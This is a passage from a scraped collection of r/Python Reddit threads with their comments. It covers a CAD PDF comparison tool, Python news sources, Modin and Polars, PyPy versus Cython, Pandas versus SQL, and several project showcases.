    "post_content": "First time poster here,\nIll preface this post by saying I am not a software engineer by any metric. I am a hobbyist programmer and I mainly just create programs I find particularly useful in my day job as a designer.\nFigured I would share my handy PDF comparison tool, see if anyone else can find it useful as well. This tool is mostly designed around comparing CAD drawings. It probably isn't great for comparing text documents at the moment though I plan to add this functionality.\nIt works by comparing the pdf's page by page in a raster image format. It creates several output files of different styles:\nMarkup Page\nDifferences Page\nOverlay Page\nThe markup page is the main page (File 1) with outlines around any changes and some boxes to highlight larger areas.\nThe differences page is essentially the main page - the secondary page. Any changes that were \"removed\" since the previous version end up in red and anything that was \"added\" is in blue.\nThe overlay page is the secondary page in red with the main page slapped on top showing differences quite nicely in red.\nDon't judge too harshly :)\nhttps://github.com/TMan9654/PyPDFCompare",
    "comments": [
        {
            "author": "naturememe",
            "score": "7",
            "content": "I found typos in your code, but overall it is a good concept and use case. elif (option == \"-o\" or option) == \"--output\" and path.exists(value): The first closing parenthesis is in the wrong place. There are two lines with the same error.",
            "replies": [
                {
                    "author": "Motox2019",
                    "score": "2",
                    "content": "Good catch, guess I think a little faster than I type sometimes. Thanks"
                }
            ]
        },
        {
            "author": "larsga",
            "score": "3",
            "content": "I haven't looked at the code, but something that can compare text documents would be fantastically useful."
        },
        {
            "author": "BenXavier",
            "score": "2",
            "content": "My compliments mate! If you want to push a bit your programming skills and make this even more useful for the communityz think of packaging It and sending to Pypi!"
        },
        {
            "author": "Additional-Tax-5643",
            "score": "2",
            "content": "This is fantastic and very useful. Congratulations, and I mean this sincerely in case it accidentally sounds sarcastic.",
            "replies": [
                {
                    "author": "Motox2019",
                    "score": "1",
                    "content": "Thank you for your compliments!",
                    "replies": [
                        {
                            "author": "Additional-Tax-5643",
                            "score": "2",
                            "content": "You're welcome. I just wanted to say that your project is kinda unique because it involves technical drawings instead of text, which is what most people would have done. This is the sort of thing my dad would have found really useful in his work as a structural engineer, for comparing shop drawings, etc."
                        }
                    ]
                }
            ]
        },
        {
            "author": "MagicWishMonkey",
            "score": "2",
            "content": "Sounds cool! You should add screenshots of the output files, it’s not really clear from the GitHub readme what it actually does",
            "replies": [
                {
                    "author": "Motox2019",
                    "score": "2",
                    "content": "Thanks for the feedback. I added some example PDFs, will look at adding a bit more and organizing the repository better for folks. Will also update the readme to better explain the software and its current limitations :)"
                }
            ]
        },
        {
            "author": "Zumwalt1999",
            "score": "2",
            "content": "This looks to be exactly what I need. I constantly generate, and deal with pdf's from other groups. This might make comparing on two monitors a thing of the past."
        },
        {
            "author": "tcmeng",
            "score": "2",
            "content": "This is awesome.. FYI Bluebeam has overlay and comparison tools that work really well"
        },
        {
            "author": "RevolutionaryRain941",
            "score": "2",
            "content": "You have a very innovative thinking. A simple but great product, that to if you are not a professional programmer.",
            "replies": [
                {
                    "author": "Motox2019",
                    "score": "1",
                    "content": "Thank you for your compliment :)"
                }
            ]
        }
    ]
},
{
    "post_author": "wanderingmonster",
    "post_id": "1bvp6vy",
    "post_score": "115",
    "post_time": "Thursday, April 4, 2024 at 5:53:41 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Where are you getting your Python news? (besides right here, of course)",
    "media": [
        "https://www.reddit.com/r/Python/",
        "https://www.reddit.com/r/Python/comments/1bvomqn/pandas_is_it_really_helpful/"
    ],
    "post_content": "Hello all. I just saw this post about Pandas, which lead to a discussion of Polars being much faster. Polars, which I had never heard about before this morning.\nThis leads me to wonder: where are you all getting your Python news and other information? r/Python obviously, but I fear there are some pipelines or subscriptions for Python news, information about must-have new packages, and the like that I'm currently missing.",
    "comments": [
        {
            "author": "cbgrey",
            "score": "61",
            "content": "Podcasts. Python Bytes and Talk Python mostly. Michael’s stuff is great.",
            "replies": [
                {
                    "author": "Mickey2by4",
                    "score": "6",
                    "content": "Don’t suppose you have recommendations for other technologies that have good podcasts? I know this is a pretty vague question, I’m mainly looking for something that covers the current happenings and state of the tech industry alongside something in web dev"
                },
                {
                    "author": "monorepo",
                    "score": "4",
                    "content": "I listen to these every week :D recommend"
                },
                {
                    "author": "ace_hawk5",
                    "score": "3",
                    "content": "I never even considered a Python podcast. I'll check it out!",
                    "replies": [
                        {
                            "author": "richieadler",
                            "score": "1",
                            "content": "Those in particular are very good. Python Bytes is good for the news, and it has a light tone and it's fun. The sites are also very easy to remember: https://talkpython.fm and https://pythonbytes.fm"
                        }
                    ]
                }
            ]
        },
        {
            "author": "OreShovel",
            "score": "17",
            "content": "mCoding on youtube is fantastic"
        },
        {
            "author": "thedeepself",
            "score": "15",
            "content": "PyCoders weekly is good https://pycoders.com/issues/621 Polars has been discussed in this group. In fact the author of it announced his company and funding re related to polars in this subreddit."
        },
        {
            "author": "treyhunner",
            "score": "6",
            "content": "For me pretty much one place: the Python Bytes podcast. I'm subscribed to Python Weekly, PyCoder's Weekly, the official PSF newsletter (fairly infrequent emails on that one), and I occasionally check some of the official Python forums for news on a specific topic (e.g. Python on WebAssembly or PEP discussions). But the Python Bytes podcast is by far the most regular way that I get my news. I struggle to check emails and forums frequently, but I listen to podcasts every single day. It's a bonus for me that I like the cohosts (both as cohosts and as humans). My recommendation is to find a source that seems to work for you and stick to it. No need to check it every day, every week, or even every month. Regularity is more helpful than frequency."
        },
        {
            "author": "jamall1978",
            "score": "4",
            "content": "Follow #python on mastodon"
        },
        {
            "author": "quangduong",
            "score": "6",
            "content": "I frequently read tutorials on realpython.com. They often have updates on python new development, trending packages, preview features of coming releases, and also review of Pycon. Pretty interesting and useful."
        },
        {
            "author": "ChungusProvides",
            "score": "3",
            "content": "bitecode.dev is my fave, so much so that I'm pledging money."
        },
        {
            "author": "Jedkea",
            "score": "6",
            "content": "TLDR is a morning newsletter that often has python related content.",
            "replies": [
                {
                    "author": "JohnLocksTheKey",
                    "score": "6",
                    "content": "Pshh - nobody reads that"
                }
            ]
        },
        {
            "author": "TijnvandenEijnde",
            "score": "2",
            "content": "I don't follow Python news myself, however, RSS feeds in combination with a RSS Reader can be a great way to stay informed without having to go to different places. You could check out this page: https://rss.feedspot.com/python_rss_feeds/ to search for relevant Python feeds. If you like the idea and you are still looking for a RSS Reader you could give my application a try: https://play.google.com/store/apps/details?id=com.your_news. Of course, any RSS reader will do. Hope it helps! Edit: You can also follow this subreddit using RSS."
        },
        {
            "author": "nfearnley",
            "score": "2",
            "content": "My friend Digi. We work on Python projects together so Digi always catches me up on the latest Python news when we meet up.",
            "replies": [
                {
                    "author": "wanderingmonster",
                    "score": "2",
                    "content": "Do they make house calls?"
                }
            ]
        },
        {
            "author": "Swift3469",
            "score": "2",
            "content": "Anywhere but podcasts...I like reading about pythonic things from just about any type of blog, library post, git*.com, pypi searches, and of course from source code of well written apps and libraries...just can't listen to folk yammer on about coding!"
        },
        {
            "author": "pro0706",
            "score": "2",
            "content": "Arjancodes is great too on yt"
        },
        {
            "author": "jollyjackjack",
            "score": "2",
            "content": "Some useful resources: https://realpython.com/ (they usually do a monthly news post - eg. https://realpython.com/python-news-february-2024/) https://bas.codes/ (weekly This Week in Python) https://pycoders.com/ (weekly news) https://www.bitecode.dev/ (monthy \"What's up Python\" posts) https://mail.python.org/archives/list/python-announce-list@python.org/ (release announcements) https://pythoninsider.blogspot.com/ (core development news) I have an RSS feed. Anytime I find an interesting blog or whatever, just add it. Soon enough you'll have a bountiful customised feed. Hackernews is also a good resource, and you can add specific searches to an RSS feed with this tool https://hnrss.github.io/ (eg. https://hnrss.org/newest?q=python). Lobste.rs is less of a firehose of content and is also worthwhile to follow. You can get RSS for the python tag here https://lobste.rs/t/python.rss Here is a random smattering of blogs you might also find interesting (not all Python, but it's nice to branch out too!) https://snarky.ca/ https://pythonspeed.com/ https://vickiboykis.com/ https://jvns.ca/ https://simonwillison.net/ https://matklad.github.io/ Maybe a bit off topic, but I can also highly recommend \"watching\" a bunch of repos on GitHub. Subscribe to releases, and even issues/pull-requests. You can always change your preferences if it's too much, but it's quite nice to have notifications of the latest goings on."
        },
        {
            "author": "rchaudhary",
            "score": "2",
            "content": "Python Weekly"
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1bzdqzx",
    "post_score": "0",
    "post_time": "Tuesday, April 9, 2024 at 3:00:08 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Tuesday Daily Thread: Advanced questions",
    "media": [],
    "post_content": "Daily Thread",
    "comments": []
},
{
    "post_author": "linchpiner",
    "post_id": "1bt4w6z",
    "post_score": "0",
    "post_time": "Monday, April 1, 2024 at 5:17:38 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "How to parallelize Pandas with Modin",
    "media": [
        "https://dchigarev.github.io/modin_perf_examples/"
    ],
    "post_content": "Discover the power of Modin in overcoming the performance bottlenecks of Pandas. We'll walk you through how a simple switch can reduce your waiting times and make your workflow smooth and speedy, all without leaving the comfort of Pandas behind.\nModin is an active open source project. Take a look to this blog post to see if it is applicable for your code: https://dchigarev.github.io/modin_perf_examples/",
    "comments": [
        {
            "author": "serjester4",
            "score": "10",
            "content": "Great article! Personally I've shifted almost all my non-legacy dataframe work to polars. It seems better in every way - lower memory usage, intuitive API, significantly faster, multicore. I honestly hope I don't have to deal with genuinely massive datasets that need something like Modin.",
            "replies": [
                {
                    "author": "thedeepself",
                    "score": "3",
                    "content": "Take a look at Ibis. https://ibis-project.org/"
                }
            ]
        },
        {
            "author": "thedeepself",
            "score": "1",
            "content": "Objectively compare it with Ibis?",
            "replies": [
                {
                    "author": "linchpiner",
                    "score": "3",
                    "content": "Modin is designed to be a drop-in replacement for Pandas, so the existing Pandas code can be executed faster. Pandas has 40k stars in GitHub, Ibis has 4k stars in GitHub, so objectively Pandas API is 10 times more popular than Ibis API."
                }
            ]
        },
        {
            "author": "big_data_mike",
            "score": "2",
            "content": "I just use polars"
        },
        {
            "author": "thedeepself",
            "score": "2",
            "content": "Modin is much slower than polars? https://pola.rs/",
            "replies": [
                {
                    "author": "sad-python-function",
                    "score": "2",
                    "content": "I believe you are referring to a graph in which modin performs the benchmark in 758 sec, and the polars in 11 seconds. These results are most likely not relevant, there is an issue that asks about this. I would suggest waiting a bit for updated results."
                }
            ]
        }
    ]
},
{
    "post_author": "easylifeforme",
    "post_id": "cxi7nd",
    "post_score": "1708",
    "post_time": "Friday, August 30, 2019 at 6:08:41 PM GMT+3",
    "flair_text": "",
    "post_title": "My school's business analytics course is taught in python. This is their textbook!",
    "media": [
        "https://preview.redd.it/owq8nk6fqlj31.jpg?width=640&crop=smart&auto=webp&s=4d70424885d6e0323d5325e93155512f4bb89126",
        "https://i.redd.it/owq8nk6fqlj31.jpg"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "ehmatthes",
            "score": "776",
            "content": "Hi, I'm the author of Python Crash Course. Thank you for sharing this. :) When I started working on the book, I was teaching an introductory programming class for high school students. After a while I noticed that all the resources I tried to use either assumed too much about what students knew, or treated them like little kids. I decided to write a book that would simplify things as much as possible, but wouldn't speak down to people. The guiding question for writing the book was, \"What's the least you need to know about programming in order to start working on interesting projects?\" I hoped it would be appealing to anyone old enough to not want a kids' book. I had no idea how wide this range would really be. I've heard from people as young as upper elementary school, to people who are older and retired, and everyone in between. It's tremendously satisfying to have created something that works for such a wide audience. It's been particularly satisfying to hear from undergraduate and graduate students who have used PCC to supplement their more thorough, but much drier required texts. It's really interesting to see PCC becoming adopted as one of the required texts for a number of courses. I certainly did not expect to see that happen. If you don't mind my asking, do you know what the syllabus looks like for the course? I would guess you'd work through the first half of the book, and then maybe do the data analysis projects?"
        },
        {
            "author": "0x0012013",
            "score": "96",
            "content": "As someone who's been coding in Python for a little over 5 years, that book is still a reference point I use every now and again. It's one of the best programming books I've ever read, PERIOD. Best place to start for anyone wanting to get into Python."
        },
        {
            "author": "woooo4",
            "score": "23",
            "content": "See that makes sense, it's a python causing a crash. My math textbook has a picture of a chili with a mustache on it. That's it. Blue background with a mustached chili in the middle."
        },
        {
            "author": "the_battousai89",
            "score": "25",
            "content": "Nice! Currently working through this myself. A definite good read."
        },
        {
            "author": "[deleted]",
            "score": "6",
            "content": "Huh, wonder why they didn't opt for the 2nd edition that's been out for a few months?"
        },
        {
            "author": "[deleted]",
            "score": "5",
            "content": "Is python crash course better to learn python compared to automate the boring stuff with python?"
        },
        {
            "author": "toshels",
            "score": "5",
            "content": "I don't know python I'm just lurking, I wish Java would have this kind of community."
        },
        {
            "author": "vanxblue",
            "score": "4",
            "content": "I bought the bundle from the same creator in Humble Bundle. Kind sad it didn’t include the crash course book."
        },
        {
            "author": "MouFl0w",
            "score": "7",
            "content": "I've only just had a copy delivered yesterday! I'm enjoying it at the moment!"
        },
        {
            "author": "theodosius_the_great",
            "score": "3",
            "content": "Nice!Post this to r/DesignPorn."
        }
    ]
},
{
    "post_author": "pdwp90",
    "post_id": "kplhhf",
    "post_score": "1788",
    "post_time": "Sunday, January 3, 2021 at 5:28:26 PM GMT+3",
    "flair_text": "Intermediate Showcase",
    "post_title": "8 months ago, I started writing code to scrape and visualize data on stock trading by US politicians. Since then I’ve received hundreds of thousands of visitors to the dashboard and just finished up the first version of a Python package that will make it easier for others to work with the data.",
    "media": [
        "https://kardatzke.medium.com/analyzing-politicians-stock-trading-in-python-1e61aafc5bf4",
        "https://pypi.org/project/quiverquant/",
        "https://www.quiverquant.com/sources/senatetrading",
        "https://www.quiverquant.com/sources/housetrading",
        "https://api.quiverquant.com/",
        "https://www.reddit.com/r/dataisbeautiful/comments/gwocvt/sen_richard_burr_stock_transactions_alongside_the/"
    ],
    "post_content": "If anyone wonders what the most suspect trading has been since I started actively tracking it, it was this interesting behavior by Sen. Richard Burr near the start of this year.\nI recently built an API allowing access to some of the datasets I've collected (which includes stuff like wallstreetbets discussion, wikipedia page views, and other alternative data) and today I finished building a Python package that makes it super easy to get the data into a clean format in a Pandas dataframe.\nHere’s a quick tutorial I put together this morning showing how get data on recent stock trading by US politicians and perform some basic analysis.\nHere’s a link to the dashboard I built tracking senate trading and here’s a link to the dashboard I built tracking trading by the house of congress.\nThis community was very helpful when I was first getting started with the language, and I'd love to answer any questions you have about this project.",
    "comments": [
        {
            "author": "x1811agent",
            "score": "61",
            "content": "Very interesting. Where did you get the data from?"
        },
        {
            "author": "ForgotPWAgainSigh",
            "score": "30",
            "content": "Wow dude, this is great! Much more useful than some of the paywall subscriptions out there"
        },
        {
            "author": "Fahad1770",
            "score": "19",
            "content": "great! people like you are making the world easier. keep up the good work dude. god bless you."
        },
        {
            "author": "kapanenship",
            "score": "15",
            "content": "Thank you for all of this. Not only a great tutorial on how to do this, but also a great visual of showing obvious political corruption within our system"
        },
        {
            "author": "[deleted]",
            "score": "14",
            "content": "What's your stack like for deploying the site?"
        },
        {
            "author": "[deleted]",
            "score": "8",
            "content": "I love it when people use Python for really practical stuff that needs to be shown in public and is accessible! Great work!"
        },
        {
            "author": "spiritual_agnostic",
            "score": "7",
            "content": "Are the API's free to use. Is there any limit on how many times I can call it in an hour. Thanks."
        },
        {
            "author": "jackc31415",
            "score": "12",
            "content": "This is cool. But it is an ad! This guy works for the company that sells access to the data for $10/month. I think that the pricing is actually very reasonable, but I think u/pdwp90 should have stated up front that you need to pay to access the data."
        },
        {
            "author": "CaptScrap",
            "score": "5",
            "content": "Nice, what'd you use for the UI?"
        }
    ]
},
{
    "post_author": "economicurtis",
    "post_id": "1bvvunv",
    "post_score": "35",
    "post_time": "Thursday, April 4, 2024 at 10:11:45 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Do you make display-tables in Python? - \"The Design Philosophy of Great Tables\"",
    "media": [
        "https://posit-dev.github.io/great-tables/blog/design-philosophy/"
    ],
    "post_content": "The maintainer of `great_tables` released an article about the design philosophy of his package https://posit-dev.github.io/great-tables/blog/design-philosophy/\nCurious about your thoughts. What tools do you prefer to use when you need to share a data table based on work you've done in python?",
    "comments": [
        {
            "author": "matjaz_b",
            "score": "7",
            "content": "Depends... Usually I just save pandas DataFrame to clipboard and paste it into excel/word/confluence and format it there. For automatic generated engineering reports, I use jinja2 and export to HTML with some plain css. If I was making some frequent reports (weekly/monthly) then I'd consider something like great tables."
        },
        {
            "author": "boogrit",
            "score": "5",
            "content": "I've spent too much time on wonderful tabled output that end up wrapping because 90% of the interaction with them is through a terminal, which by definition cannot scroll horizontally. I wrote some tediously stupid code with displaying panda df though a terminal that used adaptive width based on the developer's terminal size, and paginates the df to that width. Of course, that's awful in for its own reasons. Makes me want to avoid terminal tools altogether and just funnel everything into some browser."
        },
        {
            "author": "iliasreddit",
            "score": "4",
            "content": "Can you use the package to get nicely formatted excel tables based on a pandas dataframe?"
        },
        {
            "author": "robberviet",
            "score": "1",
            "content": "Pandas_df.to_markdown(). Works in stdout, in my notes (md), in chat, in github..."
        },
        {
            "author": "brasticstack",
            "score": "1",
            "content": "To anybody thinking about reading the article, it's quite a ramble... I scrolled a bit and read When agriculture became more widespread (ca. 10,000 years ago) .. etc etc etc ... And decided that my interest level was in the negative. tabulate is a nice, if somewhat messy table formatting library, and I like that it's only a single py file."
        }
    ]
},
{
    "post_author": "Financial_Muffin396",
    "post_id": "1bwxkum",
    "post_score": "34",
    "post_time": "Saturday, April 6, 2024 at 3:12:09 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "I created a way to connect your Python to LLM to provide it with debugger-level context (OpenSource)",
    "media": [
        "https://github.com/CaptureFlow/captureflow-py",
        "https://github.com/CaptureFlow/captureflow-py/pull/21"
    ],
    "post_content": "I recently developed an OpenSource solution that can auto-fix production exceptions for Python servers. Think of it as Datadog, but with the added capability to refactor your code. Currently, it's suitable for experimental use, and yes based on OpenAI API.\nThe source code is available at https://github.com/CaptureFlow/captureflow-py.\nWhat My Project Does:\nIt incorporates a tracer client-side Python library and backend that accumulates such traces and is capable of proposing code improvements for your repository. It traverses the execution graph, extracts relevant parts of it, enriches it with implementation data from the GitHub API, and then generates suggestions using the OpenAI API.\nTarget Audience:\nPython users who are interested in exploring code generation powered by production data (shoutout to DevinAI console.logging itself).\nComparison:\nWhile there are not many direct comparisons, the POC use case for exception fixing is somewhat similar to Sentry's AI auto-fix feature that was released couple weeks ago. However, this library is not a replacement; it provides verbose tracing logs and will degrade your app's performance (for now).\nExample:\nFor a bugfix POC, check out this toy MR and explore the source code. Feedback and stars are welcome.",
    "comments": [
        {
            "author": "kutay25",
            "score": "3",
            "content": "Very cool! Is it your personal project for fun, or do you have a specific plan for it?",
            "replies": [
                {
                    "author": "Financial_Muffin396",
                    "score": "2",
                    "content": "Thanks! Planning to explore the potential uses of such tracing data, including auto-fixing exceptions, generating tests, and producing type annotations. Then we plan to productionize and think about the simplest way to ship such automation to users :) I think open-source is a good fit for something that processes very sensitive data."
                }
            ]
        },
        {
            "author": "qa_anaaq",
            "score": "1",
            "content": "This is cool. I'd love to see more documentation to better understand its use cases, esp. how it incorporates github. Also, can you explain more on the performance degradation and some ideas on how to fix? E.g., background tasks, etc?"
        },
        {
            "author": "josefillo",
            "score": "0",
            "content": "This is amazing! One day I'll reach your level. Happy coding!",
            "replies": [
                {
                    "author": "Financial_Muffin396",
                    "score": "3",
                    "content": "I would not say it's anything advanced (yet), but thanks man"
                }
            ]
        }
    ]
},
{
    "post_author": "Sc0urge_",
    "post_id": "1bs7mv1",
    "post_score": "78",
    "post_time": "Sunday, March 31, 2024 at 1:54:58 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Does anyone actually use PyPy or Cython?",
    "media": [],
    "post_content": "I have been reading a lot about these tools recently and wondered if they are used in production, especially when building a backend with Python. As far as I know, PyPy is not ideal because of its lack of package support, but Cython seems pretty neat.",
    "comments": [
        {
            "author": "bfcdf3e",
            "score": "197",
            "content": "FYI these two things aren’t really comparable. PyPy is a runtime, basically an alternative to the “standard” python interpreter (aka cpython) most people would have installed by default. There are other runtimes, like Jython (runs python code in the Java virtual machine), etc. In theory they can all run your python code, with some low level caveats and differences in performance. Cython is a language, like python but with additional support for C types and such to enable writing more performant code in specific circumstances, usually when running on the standard/cpython interpreter. Both are used in production, but only when needed - if you’re doing yourself, “should I use this?” the answer is probably no. (Same goes for me)",
            "replies": [
                {
                    "author": "cig-nature",
                    "score": "78",
                    "content": "if you’re doing yourself, “should I use this?” the answer is probably no. OP, this is the best advice. They are both powerful amazing tools, but they should be left on the shelf until you need them. Keep your code as simple as humanly possible until you're forced to take on complexity. Often it's better to simply not have a feature until it can be done easily, rather than forcing it early.",
                    "replies": [
                        {
                            "author": "RR_2025",
                            "score": "3",
                            "content": "if you’re doing yourself, “should I use this?” the answer is probably no. Haha I remember it was (probably) Raymond Hettinger who said the same for __slots__..."
                        },
                        {
                            "author": "WallyMetropolis",
                            "score": "10",
                            "content": "Both are pretty difficult to migrate to for any moderately complex system. So if you know (and I mean, really know) that you need the performance upfront then I suppose you should ... well, no, in that case you shouldn't be writing the thing in Python. That's what Rust is for.",
                            "replies": [
                                {
                                    "author": "Artephank",
                                    "score": "16",
                                    "content": "It's different, quite challenging to write, language. Not the same thing. On other hand, Cython is like Python with type hints. Available to any Python developer with a little bit of additional knowledge to grasp. The two main use cases of Cython are: when you MUST use loops for your algorithms (cannot vectorize it for some reason and use numpy) - then you extract this part to code to additional module, type it and compile. when you want to write some low-level driver or smth and you need to interact with c libraries directly, without Python objects. None of above would be covered by Rust as far as I know"
                                },
                                {
                                    "author": "ASuarezMascareno",
                                    "score": "5",
                                    "content": "Or you can't avoid python, unless you redo from scratch decades of libraries, but still need every last drop of performance python can provide."
                                },
                                {
                                    "author": "eztab",
                                    "score": "4",
                                    "content": "In the use case of numerics tools you are better off staying with python and getting performance from there. For something standalone, probably switch to a hardware nearer language, like Rust."
                                }
                            ]
                        },
                        {
                            "author": "PaintItPurple",
                            "score": "2",
                            "content": "This is good advice for Cython, but using Pypy doesn't really affect your code. You can just use whichever interpreter works better for you.",
                            "replies": [
                                {
                                    "author": "cig-nature",
                                    "score": "2",
                                    "content": "If you have great tests, yes. If not, then it's going to take a while to revalidate everything. But I agree Pypy is WAY more approachable."
                                }
                            ]
                        },
                        {
                            "author": "Ajax_Minor",
                            "score": "1",
                            "content": "How do you know you need to get the stuff off the shelf? Similar how do you know when you need to \"object orient\" your code with he added complexity?",
                            "replies": [
                                {
                                    "author": "cig-nature",
                                    "score": "1",
                                    "content": "These kinds of tools? After explaining to the business side of things this thing is going to be super low value per time invested, and offering a couple other options (like re-writing in Rust, or making a Python package to handle the 'hard part' in C/Rust). In terms of Object Orientation that's more of a vibe thing. Since the user will not be able to tell if your code is object oriented or not. More or less whenever you think it will make things easier to understand for whoever will be working on this thing next. I often split files because I want to be able to have two sections of it side by side, (which is an indicator that the file has too many lines)."
                                }
                            ]
                        }
                    ]
                },
                {
                    "author": "SirLich",
                    "score": "7",
                    "content": "Piggy-backing on this good explanation to point out a few more libraries for the OP to read up on: Mojo is a strange superset of Python targeted at AI use-cases (like, building AI) Py03 is a rust-python interop setup. Would be used for example to write high-performance libraries in rust, and expose them to Python GraalPy is a Python interpreter written to run on Graal (Java thing), with Java interop. Numba is a JIT compiler which allows generating machine code from Python (only a subset though!) Hylang a lisp that transforms itself to python AST in order to benefit from Python ecosystem There is a LOT more like this. Python is a mature language, and has plenty of off-shoots ranging from white-box implementations of the Python interpreter, JITs, subsets, supersets, and syntax wrappers."
                }
            ]
        },
        {
            "author": "Ogi010",
            "score": "48",
            "content": "cython is used quite extensively in the scientific computing libraries (numpy, scipy, and so on...)"
        },
        {
            "author": "QuickNick123",
            "score": "17",
            "content": "Yes, we used PyPy for years, until a bit over a year ago when CPython 3.11 was released. In 3.11 the difference in execution speed between PyPy and CPython was so negligible for our software, that we switched back to CPython. 3.12 gave another nice performance boost. We do a lot of CPU bound NetworkX graph calculations. We're currently in the process of migrating parts of our software to cuGraph."
        },
        {
            "author": "Raccoonridee",
            "score": "14",
            "content": "I only \"used\" PyPy in programming contests, where it often provides faster test completion than regular CPython at the cost of higher memory footprint. So far I haven't found a good reason to use it anywhere else."
        },
        {
            "author": "New-Watercress1717",
            "score": "9",
            "content": "Never used either directly in production. I have heard stories of other people using pypy in production. I don't think most everyday code is written in a way to let pypy's tracing jit to shine(due to too much context switching). Cython is used in all sorts of packages, especially in numeric/scientific packages. Honestly, cython is targeted for numeric code; and writing python entry points to c/c++ code. Cython lacks support for speeding up code that uses alot of hashmaps and strings. I pray someone will create tools to quickly unbox python strings and hashmaps, so I can use cython to optimize business code.(this might involve the cpython guys making public some of their api)."
        },
        {
            "author": "HomeTahnHero",
            "score": "7",
            "content": "Yes, PyPy gives about a 6x speed up over CPython for us. We’re doing a genetic algorithm on NetworkX graphs, so it’s pretty CPU bound."
        },
        {
            "author": "QuantumQuack0",
            "score": "7",
            "content": "We're about to use Cython to obfuscate our code by pre-compiling it, at the boss's request (yes, he is not very good with software). Unfortunately our team is too inexperienced to form a strong enough case against it. And we lack experience in compiled languages, plus our application engineering team (who often works on the same package) would not be able to do any more development since they definitely have no experience with anything else but python."
        }
    ]
},
{
    "post_author": "ChristianPacifist",
    "post_id": "1byhpm7",
    "post_score": "92",
    "post_time": "Monday, April 8, 2024 at 1:40:06 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Do folks ever use Pandas when they should use SQL?",
    "media": [],
    "post_content": "I think I see this a lot.\nI believe SQL, including like dataframe SQL packages, should always be used over Pandas when possible unless one is doing something Pandas is more suited to or unless someone requires broader Python control structures or features.\nI am a big believer in sticking to SQL as a baseline data manipulation framework and only using other frameworks if SQL is lacking. One of the biggest ways to accumulate technical debt is solving problems in multiple ways that are not standardized that not all people know.",
    "comments": [
        {
            "author": "ughidkguys",
            "score": "561",
            "content": "SQL and Pandas are two very different things. I would argue that anyone who sees them as substitutes is probably misusing both of them.",
            "replies": [
                {
                    "author": "Eitheror97",
                    "score": "27",
                    "content": "This used to be true, but with libraries like Ibis and dbt in combination with DuckDB you can pretty much get the best of both worlds"
                }
            ]
        },
        {
            "author": "qckpckt",
            "score": "160",
            "content": "I see this kind of mentality from devs all the time. It’s very myopic. It’s easy to look at any one thing in a business codebase and tear it to shreds. There’s almost always a “better” or “more correct” way of doing things. I think devs often don’t realize that this is way more obvious than they think it is. The problem is these things don’t account for the realities of a business. For example, the background and experience levels of the developers who work there, imperfect decisions made in the past, whether or not doing it the “correct” way has any meaningful benefits at all, etc. These things typically fall outside the remit of developers who think this way, and so they’re dismissed as being unimportant. But the reality is, if you are working somewhere that is using pandas in a way where SQL would be more efficient, then that’s almost certainly because the familiarity and comfort levels using SQL are low or nonexistent amongst the developers working there. I’m saying this from experience having worked somewhere where this was exactly the case. A senior technical decision maker saw that we were running into performance and resource issues, and decided that we’d use duckdb instead. It was a total disaster. Performance plummeted through the floor, code was terrible, buggy, inaccurate. People started using duckdb in the worst way you could possibly imagine because it made sense to them based on what they were familiar with. The “best” solution is only the best solution if the people responsible for building and maintaining it know how to use it. It’s easy for devs to massively underestimate how little other devs know about things that they are familiar with. You mention tech debt - I guarantee that the worst cases of tech debt will be ones where a dev has unilaterally decided to use a particular technology because it was “the best” approach, despite it being poorly understood by the rest of the org. In my example, I had to spend months patiently training people on how to work with SQL, and also how to build a mental model of delayed execution frameworks like duckdb, in order to slowly limp the organization back towards being even remotely efficient.",
            "replies": [
                {
                    "author": "ProbsNotManBearPig",
                    "score": "32",
                    "content": "Amen. Everyone on the internet is out to critique others for not doing things the “right” way, but the right way for your teams project is very personal. It’s a combination of many things that people who aren’t intimately familiar with the project aren’t qualified to authoritatively comment on."
                }
            ]
        },
        {
            "author": "mike-manley",
            "score": "89",
            "content": "I mean, Pandas isn't some obscure Python package. But as an experienced SQL data engineer, I tend to gravitate to SQL. That being said, it's good to diversify your data tools and skills when opportunity arises."
        },
        {
            "author": "twitch_and_shock",
            "score": "73",
            "content": "There's plenty of times that exploratory research is being done using local data sets in a way that SQL or another database would be overkill. Pandas also interfaces so well with numpy and other data science and ML libraries that it's just more convenient and efficient to begin trying out ideas with pandas."
        },
        {
            "author": "miemcc",
            "score": "18",
            "content": "Depends on the volume of data and the complexity of the query / transformation. Almost certainly, it will be a combination of both. SQL to filter and pull the information out, and Pandas to deal with anything more complex and transform the data for visualisation. Can it it screwed by using either technique incorrectly? Absolutely! Generally, I would use SQL to filter and pull the information out, possibly group too. But I am normally looking to do multiple transforms. So I'll use Pandas and visualise with bokeh or seaborne."
        },
        {
            "author": "Valeen",
            "score": "29",
            "content": "Should use or can use? People use pandas when they really should be using numpy if they cared about xyz (speed most likely but maybe something else). Hell people use python when they should use C if they cared about flops. Hell why aren't you using cuda? Human resources are finite and sometimes people just need a low friction way to explore data. We have tools for different jobs and it's up to you to decide what to use. Need to explore a new dataset? Pandas. Need to run something daily where cycles count? Do it in SQL."
        },
        {
            "author": "Its_NotTom",
            "score": "9",
            "content": "I really appreciate how quick it is to work with data in pandas (pretty great for working on early stage ML and data science tasks), but yeah I would say that there is most likely an overdependency on it"
        },
        {
            "author": "ChadGPT5",
            "score": "9",
            "content": "SQL is generally better for ETL (extract, transform, load) operations because it is heavily optimized by the server to be fast for those. Pandas is better for EDA (exploratory data analysis) because it is consistent, readable, flexible, and as of 2.0, reasonably optimized. The ideal workflow is to use SQL for joins and filters to get your data into a single table at the granularity you need for analysis, then to actually do your analysis in Pandas. Using SQL to do complex analysis is every bit as inefficient and ugly as downloading 20 base tables and trying to join and filter them in Pandas. As others have said, use the right tool for the right job."
        }
    ]
},
{
    "post_author": "Gedanke",
    "post_id": "c8s5ym",
    "post_score": "1707",
    "post_time": "Wednesday, July 3, 2019 at 10:07:11 PM GMT+3",
    "flair_text": "",
    "post_title": "Using Python to find a prime number that looks like the python logo (or any other image) from far away [OC]",
    "media": [
        "https://i.redd.it/w4bawg6gz4831.png",
        "https://preview.redd.it/w4bawg6gz4831.png?auto=webp&s=e04ef4e393a804e680be68dc2508f22066d76bf2"
    ],
